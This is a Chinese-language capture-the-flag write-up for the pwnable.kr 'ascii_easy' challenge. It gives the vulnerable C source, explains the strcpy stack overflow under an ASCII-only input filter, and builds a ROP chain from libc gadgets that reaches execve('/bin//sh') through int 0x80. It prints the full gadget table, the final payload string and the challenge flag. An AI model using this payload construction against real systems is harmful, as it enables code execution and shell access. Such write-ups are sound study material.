# Ascii_Easy Problem
>We often need to make 'printable-ascii-only' exploit payload.  You wanna try?  
>hint : you don't necessarily have to jump at the begginning of a function. try to land anyware.  
>ssh ascii_easy@pwnable.kr -p2222 (pw:guest)

## 题目解读
    这是一个ascii-only的漏洞利用题目。
    题目中给出了一个小提示：不一定要跳到函数的开始位置，可以跳到任意位置。
    ssh登录看下题目细节。
### ascii_easy.c

	#include <sys/mman.h>
	#include <sys/stat.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>
	#include <fcntl.h>
	
	#define BASE ((void*)0x5555e000)
	int is_ascii(int c){
		if(c>=0x20 && c<=0x7f) return 1;
		return 0;
	}
	
	void vuln(char* p){
		char buf[20];
		strcpy(buf, p);
	}
	
	void main(int argc, char* argv[]){
	
		if(argc!=2){
	    	printf("usage: ascii_easy [ascii input]\n");
	    	return;
		}
	
		size_t len_file;
		struct stat st;
		int fd = open("libc-2.15.so", O_RDONLY);
		if( fstat(fd,&st) < 0){
	    	printf("open error. tell admin!\n");
	    	return;
		}
		
		len_file = st.st_size;
		if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
	    	printf("mmap error!. tell admin\n");
	    	return;
		}   
	
		int i;
		for(i=0; i<strlen(argv[1]); i++){
	    	if( !is_ascii(argv[1][i]) ){
	        	printf("you have non-ascii byte!\n");
	        	return;
	    	}   
		}   
	
		printf("triggering bug...\n");
		vuln(argv[1]);
	}
&emsp;通过上述代码可以看到vuln函数中存在溢出漏洞。在该函数中定义了20个字节的缓冲区，但是在调用strcpy函数时没有限制长度，会出现栈溢出漏洞。但是有个限制条件，函数is_ascii会判断输入的每一个字节是不是可显示的字符，如果不是的话就直接return了。也就是说如果要构造溢出的数据，需要使用可显示的ascii字符，即每一个字节都要在[0x20， 0x7f]之间，这也验证了题目给出的 'printable-ascii-only'说明。
## 解题思路
&emsp;上面已经知道了程序的溢出点在哪里，下来就是构造有效的shellcode。源码中把libc-2.15.so加载到内存，并映射到起始地址为0x5555e000处。也就是说只要能够找到符合ascii字符要求的地址，通过修改vuln函数的返回地址就可以执行。通常的做法是控制eip来执行system("/bin/sh")拿到shell。  
&emsp;首先，我们知道了libc-2.15.so的基地址为0x5555e000，使用objdump -S命令来查看system函数的地址偏移为0x3eed0，也就是说在程序执行时system对应的地址为0x5559ced0，它的地址字节并不是有效的asci字符；   
&emsp;其次，我们知道libc.so中是有“/bin/sh”字符串的，使用gdb-peda的searchmem命令来查找它的位置为0x556bb7ec,也不是符合ascii字符限制这一条件，看来构造system("/bin/sh")这样的语句是走不通了，还得想其他办法；  
&emsp;找一下其他函数的地址：

| 函数    | 偏移    | 实际地址   | ascii字符 |
| ------- | ------- | ---------- | --------- |
| execve  | 0xb85e0 | 0x556165e0 |           |
| execv   | 0xb8740 | 0x55616740 | @gaU      |
| execle  | 0xb8780 | 0x55616780 | —         |
| execl   | 0xb88e0 | 0x556168e0 | —         |
| execvp  | 0xb8a40 | 0x55616a40 | @jaU      |
| execlp  | 0xb8a80 | 0x55616a80 | —         |
| execvpe | 0xb8bd0 | 0x55616bd0 | —         |

上述表格中显示可用的函数为execv和execvp，现在就差构造参数了，查一下这两个函数的用法如下： 

	exec系列函数	
	头文件：#include <unistd.h>
	功能：用exec函数可以把当前进程替换为一个新进程，且新进程与原进程有相同的PID。exec名下是由多个关联函数组成的一个完整系列。
	原型：
	int execl(const char *path, const char *arg, ...);
	int execlp(const char *file, const char *arg, ...)；
	int execle(const char *path, const char *arg, ..., char * const envp[]);
	int execv(const char *path, char *const argv[]);
	int execvp(const char *file, char *const argv[]);
	参数：
	path参数表示你要启动程序的名称包括路径名
	arg参数表示启动程序所带的参数，一般第一个参数为要执行命令名，不是带路径且arg必须以NULL结束
	返回值:成功返回0,失败返回-1
	注：上述exec系列函数底层都是通过execve系统调用实现：
	int execve(const char *filename, char *const argv[],char *const envp[]);
在这里来说，execv和execvp函数基本一致。考虑到“/bin/sh”字符串的地址并不符合ascii字符的限制，可以采用另外一种方案：在libc.so中找到一个字符串，使得它的地址符合ascii字符的限制，可以从.rodata段中查询，使用gdb-peda的searchmem命令。这里找到一个“domains”字符串，且它的地址为0x556c2f6e。利用/tmp目录可以编辑的条件，在/tmp目录中编写新的可执行文件domains,并调用system("/bin/sh")函数，然后用export命令将/tmp目录加入到环境变量中，这样在ascii_easy中执行domains文件，就会执行到system命令，从而获得一个shell。也就是说要构造的函数为：execvp("domains", NULL);但是这里有个NULL字节的问题，我们输入的时候是不能有NULL字节的，可这两个函数的第二个参数要为NULL才能执行，如何输入NULL字节呢？再补充一个NULL字节输入的方法，如下：

	int addr;
	printf("aaaa%n\n", &addr);
	printf("addr = %d\n", addr);
这里的输出结果是什么呢？
	
	aaaa	
	addr = 4;
为什么会有这样的输出呢？因为%n这个格式化符，它会修改addr地址中的值，这个值代表之前字符的个数，在这里也就是4。利用这个技巧就可以修改指定地址中的值为0。然后找一下printf函数的地址偏移为0x4c480，再加上一个基地址就是0x555aa480，不符合ascii字符的限制，这条路也被堵死了，看来还有其他方法，知识积累不够，只能多查查资料了。

## 解题过程 ##

##### 0x01 

​	后来发现还有一种叫ROP的技术，全称叫return-oriented-programming，是一种高级的内存攻击技术，可以用来绕过堆栈不可执行等防御措施。它主要是利用一些现有程序中的代码片段来控制程序的执行，从而获得shell，这些代码片段有个叫法：gadgets。

gadgets是一些连续的指令，这些指令都是以ret指令或者类似ret指令的分支指令结束，如下所示：

Intel 示例：

- pop eax; ret
- xor ebx, ebb; ret

ARM示例：

- pop {r4, pc}
- str r1, [r0]; bx lr

在这个题目中，很明显就要用到这种技术。生成ROP链的一般步骤如下：

1. 利用gadgets在内存中写入`/bin/sh`字符串或者找到`/bin/sh`的地址；
2. 利用gadgets来初始化系统调用号(`execve-11`);
3. 利用gadgets来初始化系统调用的参数；
4. 找到int 0x80或者syscall对应的gadgets；

这样就可以构造完成的gadgets链payload，也就是说最终利用的是系统调用execve来进行攻击的。

```c
int execve(const char *filename, char *const argv[], char *const envp[]);
execve("/bin/sh", 0, 0)
```

##### 0x02

​	首先使用ROPGadgets工具来过滤gadgets，根据题目要求，输入必须是有效的ascii字符才行，也就是说gadgets地址再加上基地址(0x5555e000)之后每个字节必须在[0x20,0x7f]之间，因此需要进行过滤才行，用python对`ROPGadgets --binary libc-2.15.so`的结果进行过滤，最终输出所有有效的gadgets，并进行筛选。

利用eax计算出/bin/sh的地址，然后push到ebx中

| 栈         | ascii | gadgets                                               | description                |
| ---------- | ----- | ----------------------------------------------------- | -------------------------- |
| 0x556f4525 | UoE%  | pop edx; add dword ptr [edx], ecx; ret                |                            |
| 0x55616161 | Uaaa  |                                                       | edx = 0x55616161           |
| 0x5557506b | UWPk  | pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret |                            |
|            | /bin  |                                                       | eax = "/bin"               |
|            | aaaa  |                                                       |                            |
|            | bbbb  |                                                       |                            |
|            | cccc  |                                                       |                            |
|            | dddd  |                                                       |                            |
| 0x5560645c | U`d\  | mov dword ptr [edx], eax ; ret                        | [edx] = eax                |
|            | UoE%  | pop edx; add dword ptr [edx], ecx; ret                |                            |
| 0x55616165 | Uaae  |                                                       | edx = 0x55616165           |
| 0x5557506b | UWPk  | pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret |                            |
|            | //sh  |                                                       | eax = "//sh"               |
|            | aaaa  |                                                       |                            |
|            | bbbb  |                                                       |                            |
|            | cccc  |                                                       |                            |
|            | dddd  |                                                       |                            |
| 0x5560645c | U`d\  | mov dword ptr [edx], eax ; ret                        | [edx] = eax                |
| 0x556f4525 | UoE%  | pop edx; add dword ptr [edx], ecx; ret                |                            |
| 0x55616169 | Uaai  |                                                       | edx = 0x55616169           |
| 0x555f643f | U_d?  | add bl, al ; xor eax, eax ; ret                       | eax = 0                    |
| 0x5560645c | U`d\  | mov dword ptr [edx], eax ; ret                        | [0x55616161] = "/bin//sh"  |
| 0x556c6864 | Ulhd  | inc eax ; ret 0                                       | eax = 1                    |
| 0x0001934e | UWsN  | pop ebx ; ret                                         |                            |
| 0x55616161 | Uaaa  |                                                       | ebx = 0x55616161           |
| 0x556d2a51 | Um*Q  | pop ecx ; add al, 0xa ; ret                           | eax = 11, ecx = 0x55616169 |
| 0x55616169 | Uaai  |                                                       |                            |
| 0x55667176 | Ufqv  | inc esi ; int 0x80                                    | execve("/bin//sh", 0, 0)   |

   11112222333344445555666677778888%EoUaaaUkPWU/binaaaabbbbccccdddd\\d\`U%EoUeaaUkPWU//shaaaabbbbccccdddd\\d\`U%EoUiaaU?d_U\\d\`UdhlUNsWUaaaUQ*mUiaaUvqfU

damn you ascii armor... what a pain in the ass!! :(

